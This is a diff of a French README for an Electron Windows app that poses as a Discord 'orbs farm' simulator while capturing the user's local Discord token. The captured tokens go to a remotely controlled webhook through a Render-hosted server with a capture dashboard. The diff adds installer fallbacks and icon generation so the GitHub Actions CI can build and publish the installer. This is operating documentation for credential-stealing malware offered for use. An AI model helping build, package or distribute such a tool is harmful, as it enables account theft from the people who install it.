@@ -4,7 +4,7 @@ Trois briques :
 
 1. **L'app Windows** (Electron) : capture le token Discord local, design anime, simulation de farm d'orbs.
 2. **Le serveur** (Node/Express, deployable sur Render) : distribue l'URL du webhook et affiche les captures.
-3. **La CI GitHub Actions** : construit le `.msi` toute seule, sans Node installe sur ton PC.
+3. **La CI GitHub Actions** : construit l'installeur toute seule, sans Node installe sur ton PC.
 
 La personne qui lance l'app n'a **rien** a configurer. Le webhook est pilote a distance depuis le dashboard.
 
@@ -70,7 +70,7 @@ Optionnel : `FALLBACK_WEBHOOK` permet de coder en dur un webhook de secours si l
 
 ---
 
-## 4. Publier le .msi sans rien installer sur son PC
+## 4. Publier l'installeur sans rien installer sur son PC
 
 Le workflow `.github/workflows/build.yml` s'en occupe.
 
@@ -78,26 +78,43 @@ Le workflow `.github/workflows/build.yml` s'en occupe.
 
 1. Onglet **Actions** -> **Build Windows MSI** -> **Run workflow**.
 2. Saisis la version (`1.2.0`) et laisse `publish` sur `oui`.
-3. Au bout de quelques minutes, le `.msi` apparait dans **Releases**.
+3. Au bout de quelques minutes, l'installeur apparait dans **Releases**.
 
 ### Methode 2 - Tag Git
 
     git tag v1.2.0
     git push origin v1.2.0
 
-La release est creee automatiquement avec le `.msi` attache.
+La release est creee automatiquement avec l'installeur attache.
 
 ### Methode 3 - Push sur main
 
-Chaque push sur `main` construit le `.msi` et le depose dans les **artefacts** du run
+Chaque push sur `main` construit l'installeur et le depose dans les **artefacts** du run
 (onglet Actions -> run -> section Artifacts). Pratique pour tester.
 
 ### Ce que fait le workflow
 
 - Tourne sur `windows-latest` (Electron + WiX disponibles nativement).
+- Genere l'icone applicative via `scripts/make-icon.js`.
 - `npm install`, puis `npm run dist:ci`.
-- Verifie que le `.msi` existe bien.
+- Repli automatique sur NSIS (`.exe`) si la cible MSI echoue.
 - Upload l'artefact et cree la release GitHub avec les notes generees.
+
+---
+
+## Icone de l'application
+
+L'icone n'est pas un binaire commite : elle est **generee** par `scripts/make-icon.js`,
+en pur Node, sans aucune dependance.
+
+    npm run assets
+
+Produit `build/icon.png` (256x256) et `build/icon.ico` (16 a 256).
+Les hooks `predist`, `predist:ci`, `predist:exe` la regenerent automatiquement avant chaque build.
+
+C'est indispensable : sans icone, la cible MSI d'electron-builder echoue en
+`LGHT0094 : The identifier 'OrbRushIcon.exe' could not be found`, car le template WiX
+reference une icone qui n'a jamais ete emise.
 
 ---
 
@@ -148,8 +165,9 @@ L'auth se fait via l'en-tete `x-admin-key`.
 
 ## Structure
 
-    .github/workflows/build.yml   CI : build et publication du .msi
+    .github/workflows/build.yml   CI : build et publication de l'installeur
     scripts/ci-prepare.js         resolution de version pour la CI
+    scripts/make-icon.js          generation de l'icone (PNG + ICO, zero dependance)
     electron/main.js              processus principal, fenetre, IPC, resolution du webhook
     electron/preload.js           pont securise renderer <-> main
     electron/remote.js            appel au serveur Render (config + log)
